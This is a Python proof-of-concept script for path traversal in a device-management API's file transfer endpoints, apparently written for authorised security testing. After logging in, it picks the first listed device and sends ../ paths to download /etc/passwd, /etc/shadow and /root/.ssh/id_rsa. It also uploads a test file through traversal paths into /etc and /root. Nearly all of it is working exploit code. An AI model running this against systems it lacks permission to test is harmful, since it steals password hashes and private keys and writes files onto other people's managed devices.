#!/usr/bin/env python3
"""
Proof of Concept: Path Traversal in File Transfer Operations
Vulnerability #5 - MEDIUM

This POC demonstrates path traversal attacks in file download/upload operations
by using ../ sequences in file paths.

WARNING: Only use this on systems you own or have explicit permission to test.
"""

import requests
import json
import sys

def login(base_url, email, password):
    """Login and get JWT token"""
    print(f"[*] Attempting to login as {email}...")
    
    url = f"{base_url}/api/management/v1/useradm/auth/login"
    response = requests.post(
        url,
        headers={"Content-Type": "application/json"},
        auth=(email, password),
        json={},
        verify=False
    )
    
    if response.status_code == 200:
        token = response.text.strip()
        print(f"[+] Login successful!")
        return token
    else:
        print(f"[-] Login failed: {response.status_code}")
        return None

def get_devices(base_url, token):
    """Get list of devices to test file transfer on"""
    url = f"{base_url}/api/management/v1/inventory/devices"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    response = requests.get(url, headers=headers, verify=False)
    if response.status_code == 200:
        devices = response.json()
        if devices and len(devices) > 0:
            return devices[0].get('id')
    return None

def test_path_traversal_download(base_url, token, device_id):
    """
    Test path traversal in file download operation
    """
    print(f"\n[*] Testing path traversal in file download...")
    print(f"    Device ID: {device_id}")
    
    # Path traversal attempts
    malicious_paths = [
        "/etc/../etc/passwd",  # Basic traversal
        "/allowed/path/../../etc/passwd",  # Nested traversal
        "/tmp/../../etc/shadow",  # Multiple levels
        "/var/log/../../root/.ssh/id_rsa",  # Access sensitive files
        "/home/user/../../etc/passwd",  # From allowed directory
    ]
    
    vulnerable_paths = []
    
    for path in malicious_paths:
        print(f"\n    Testing path: {path}")
        
        url = f"{base_url}/api/management/v1/deviceconnect/devices/{device_id}/files/download"
        headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        }
        
        payload = {
            "path": path
        }
        
        response = requests.post(url, headers=headers, json=payload, verify=False)
        print(f"        Status: {response.status_code}")
        
        if response.status_code == 200:
            print(f"        [VULNERABLE] File download successful!")
            print(f"        Response length: {len(response.content)} bytes")
            vulnerable_paths.append(path)
        elif response.status_code == 400:
            print(f"        [SECURE] Path rejected (expected)")
        else:
            print(f"        Response: {response.text[:200]}")
    
    return vulnerable_paths

def test_path_traversal_upload(base_url, token, device_id):
    """
    Test path traversal in file upload operation
    """
    print(f"\n[*] Testing path traversal in file upload...")
    
    # Create a test file
    test_content = b"POC: Path traversal test file"
    
    malicious_paths = [
        "/etc/../tmp/poc_file.txt",
        "/allowed/path/../../etc/poc_file.txt",
        "/var/log/../../root/poc_file.txt",
    ]
    
    vulnerable_paths = []
    
    for path in malicious_paths:
        print(f"\n    Testing path: {path}")
        
        url = f"{base_url}/api/management/v1/deviceconnect/devices/{device_id}/files/upload"
        headers = {
            "Authorization": f"Bearer {token}"
        }
        
        # Create multipart form data
        files = {
            'file': ('poc.txt', test_content, 'text/plain')
        }
        data = {
            'path': path
        }
        
        response = requests.post(url, headers=headers, files=files, data=data, verify=False)
        print(f"        Status: {response.status_code}")
        
        if response.status_code in [200, 201]:
            print(f"        [VULNERABLE] File upload successful!")
            vulnerable_paths.append(path)
        elif response.status_code == 400:
            print(f"        [SECURE] Path rejected (expected)")
        else:
            print(f"        Response: {response.text[:200]}")
    
    return vulnerable_paths

def main():
    print("=" * 70)
    print("POC: Path Traversal in File Transfer Operations")
    print("Vulnerability #5 - MEDIUM")
    print("=" * 70)
    
    if len(sys.argv) < 2:
        print("\nUsage: python3 vulnerability_5_path_traversal.py <base_url>")
        print("Example: python3 vulnerability_5_path_traversal.py https://staging.hosted.mender.io")
        sys.exit(1)
    
    base_url = sys.argv[1]
    
    # Configuration
    email = "test@example.com"
    password = "testpassword"
    
    # Login
    token = login(base_url, email, password)
    if not token:
        print("[-] Cannot proceed without authentication token")
        sys.exit(1)
    
    # Get a device to test on
    device_id = get_devices(base_url, token)
    if not device_id:
        print("[-] No devices found to test on")
        print("[*] Note: This POC requires an active device connection")
        sys.exit(1)
    
    # Test download path traversal
    print("\n" + "=" * 70)
    print("TEST 1: Path Traversal in File Download")
    print("=" * 70)
    vulnerable_downloads = test_path_traversal_download(base_url, token, device_id)
    
    # Test upload path traversal
    print("\n" + "=" * 70)
    print("TEST 2: Path Traversal in File Upload")
    print("=" * 70)
    vulnerable_uploads = test_path_traversal_upload(base_url, token, device_id)
    
    # Summary
    print("\n" + "=" * 70)
    print("SUMMARY")
    print("=" * 70)
    
    if vulnerable_downloads:
        print(f"[!] VULNERABILITY CONFIRMED in file download!")
        print(f"    Vulnerable paths: {', '.join(vulnerable_downloads)}")
    else:
        print("[+] File download appears secure")
    
    if vulnerable_uploads:
        print(f"[!] VULNERABILITY CONFIRMED in file upload!")
        print(f"    Vulnerable paths: {', '.join(vulnerable_uploads)}")
    else:
        print("[+] File upload appears secure")
    
    if not vulnerable_downloads and not vulnerable_uploads:
        print("[+] No path traversal vulnerabilities found")
        print("[+] System appears to validate paths correctly")
    
    print("=" * 70)

if __name__ == "__main__":
    main()

